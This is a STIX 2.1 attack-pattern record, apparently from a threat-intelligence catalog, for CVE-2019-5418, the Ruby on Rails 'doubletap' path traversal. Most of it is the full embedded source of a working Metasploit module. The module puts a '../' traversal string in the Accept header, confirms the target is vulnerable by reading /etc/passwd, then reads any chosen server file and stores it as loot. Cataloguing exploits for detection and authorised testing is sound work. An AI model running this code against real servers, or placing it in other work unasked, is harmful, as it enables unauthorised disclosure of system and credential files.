{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--fb638c6f-391f-4e10-ae34-88ded7d67d09",
    "created": "2024-08-14T16:31:46.27857Z",
    "modified": "2024-08-14T16:31:46.278574Z",
    "name": "\"Ruby On Rails File Content Disclosure (doubletap)\"",
    "description": " This module uses a path traversal vulnerability in Ruby on Rails versions =< 5.2.2 to read files on a target server. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/gather/rails_doubletap_file_read.rb",
            "external_id": "rails_doubletap_file_read.rb"
        },
        {
            "source_name": "reference",
            "url": "https://hackerone.com/reports/473888"
        },
        {
            "source_name": "reference",
            "url": "https://github.com/mpgn/Rails-doubletap-RCE"
        },
        {
            "source_name": "reference",
            "url": "https://groups.google.com/forum/#!topic/rubyonrails-security/pFRKI96Sm8Q"
        },
        {
            "source_name": "reference",
            "url": "https://chybeta.github.io/2019/03/16/Analysis-for%E3%80%90CVE-2019-5418%E3%80%91File-Content-Disclosure-on-Rails/"
        },
        {
            "source_name": "CVE",
            "external_id": "2019-5418"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::HttpClient\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name'        => \"Ruby On Rails File Content Disclosure ('doubletap')\",\n        'Description' => %q{\n          This module uses a path traversal vulnerability in Ruby on Rails\n          versions =< 5.2.2 to read files on a target server.\n        },\n        'Author'      =>\n        [\n          'Carter Brainerd <0xCB@protonmail.com>', # Metasploit module\n          'John Hawthorn <john@hawthorn.email>' # PoC/discovery\n        ],\n        'License'     => MSF_LICENSE,\n        'References'     => [\n          [ 'URL', 'https://hackerone.com/reports/473888' ],\n          [ 'URL', 'https://github.com/mpgn/Rails-doubletap-RCE' ],\n          [ 'URL', 'https://groups.google.com/forum/#!topic/rubyonrails-security/pFRKI96Sm8Q' ],\n          [ 'URL', 'https://chybeta.github.io/2019/03/16/Analysis-for%E3%80%90CVE-2019-5418%E3%80%91File-Content-Disclosure-on-Rails/' ],\n          [ 'CVE', '2019-5418'],\n          [ 'EDB', '46585' ]\n        ],\n        'Notes' => {\n          'AKA' => ['DoubleTap']\n        }\n      )\n    )\n\n    register_options(\n      [\n        Opt::RPORT(80),\n        OptString.new('ROUTE', [true, 'A route on the vulnerable server.', '/home']),\n        OptInt.new('DEPTH', [true, 'The depth of the traversal.', 10]),\n        OptString.new('TARGET_FILE', [true, 'The absolute path of remote file to read.', '/etc/passwd']),\n        OptBool.new('PRINT_RESULTS', [true, 'Print results of module (may hang with large amounts of data).', true])\n      ]\n    )\n\n    register_advanced_options(\n      [\n        OptBool.new('SkipCheck', [true, 'Skip the initial vulnerability check.', false])\n      ]\n    )\n  end\n\n  def get_accept_header_value(depth, file)\n    return (('../'*depth) + file + '{{').gsub('//', '/')\n  end\n\n  def check\n    return true if datastore['SkipCheck']\n    # Check if target file is absolute path\n    unless datastore['TARGET_FILE'].start_with? '/'\n      vprint_error \"TARGET_FILE must be an absolute path (eg. /etc/passwd).\"\n      return Exploit::CheckCode::Unknown\n    end\n\n    # Fire off the request\n    res = send_request_cgi({\n      'method' => 'GET',\n      'uri' => normalize_uri(datastore['ROUTE']),\n      'headers' => { 'Accept' => get_accept_header_value(datastore['DEPTH'], '/etc/passwd')}\n    })\n\n    if res.nil?\n      vprint_error \"Request timed out.\"\n      return Exploit::CheckCode::Unknown\n    end\n\n    if res.body.include? 'root:x:0:0:root:'\n      return Exploit::CheckCode::Vulnerable\n    else\n      vprint_error 'Target is not vulnerable. Make sure your route is correct.'\n      return Exploit::CheckCode::Unknown\n    end\n  end\n\n  def run\n    unless check == Exploit::CheckCode::Vulnerable\n      print_error 'Check did not pass, exiting.'\n      return\n    end\n\n    fail_with(Failure::BadConfig, 'TARGET_FILE must be an absolute path (eg. /etc/passwd).') unless datastore['TARGET_FILE'].start_with? '/'\n\n\n    print_status \"Requesting file #{datastore['TARGET_FILE']}\"\n\n    res = send_request_cgi({\n      'method' => 'GET',\n      'uri' => normalize_uri(datastore['ROUTE']),\n      'headers' => { 'Accept' => get_accept_header_value(datastore['DEPTH'], datastore['TARGET_FILE'])}\n    })\n\n    if res.nil?\n      print_error \"Request timed out.\"\n      return\n    end\n\n    unless res.code == 200\n      print_error \"Failed to read file: #{datastore['TARGET_FILE']}. HTTP error: #{res.code}.\"\n      print_error 'User probably doesnt have access to the requested file.' if res.code == 500\n      return\n    end\n\n    unless datastore['PRINT_RESULTS']\n      print_good 'Response from server:'\n      print_line res.body.to_s\n    end\n    store_loot('rails.doubletap.file', 'text/plain', datastore['RHOSTS'], res.body.to_s, datastore['TARGET_FILE'], \"File read via Rails DoubleTap auxiliary module.\")\n    print_status 'Results stored as loot.'\n  end\nend\n"
}